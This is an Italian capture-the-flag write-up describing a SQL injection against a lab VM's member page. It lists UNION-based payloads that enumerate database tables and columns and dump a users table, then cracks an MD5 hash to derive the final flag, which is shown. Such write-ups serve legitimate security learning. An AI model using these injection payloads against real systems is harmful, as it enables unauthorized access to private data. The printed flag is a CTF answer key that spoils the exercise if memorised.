# SQL Injection Members
Nella pagina `http://192.168.56.134/?page=member` troviamo un input vulnerabile ad un attacco SQL Injection,
di conseguenza come prima cosa andiamo a leggere tutte le tabelle presenti nel db con la seguente query:
```
1 AND 1=2 UNION SELECT table_name, 1 FROM information_schema.tables
```
e scopriamo la tabella `users`, quindi ora andiamo a leggere tutte le colonne della tabella `users` con la query:
```
1 AND 1=2 UNION SELECT column_name, 1 FROM information_schema.columns WHERE TABLE_NAME = char(117,115,101,114,115)
```
Provando a cercare per `id` nell'input troviamo l'user con id 5 che contiene campi interessanti recuperati con 
le seguenti query:
```
1 AND 1=2 UNION SELECT user_id,first_name FROM users WHERE user_id=5
1 AND 1=2 UNION SELECT last_name,town FROM users WHERE user_id=5
1 AND 1=2 UNION SELECT country,planet FROM users WHERE user_id=5
1 AND 1=2 UNION SELECT Commentaire,countersign FROM users WHERE user_id=5

user_id     5
first_name  Flag
last_name   GetThe
town        42
country     42
planet      42
Commentaire Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign 5ff9d0165b4f92b14994e5c685cdce28
```
Tramite il sito [hashes](https://hashes.com/en/tools/hash_identifier) scopriamo che si tratta di un md5 quindi con 
[md5.gromweb](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28) lo decifriamo e troviamo la stringa
`FortyTwo`, ora proprio come dice nel commento portiamo tutti i caratteri in minuscolo e lo decriptiamo in sha256 con
[questo](https://emn178.github.io/online-tools/sha256.html) sito, avendo così la flag:
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```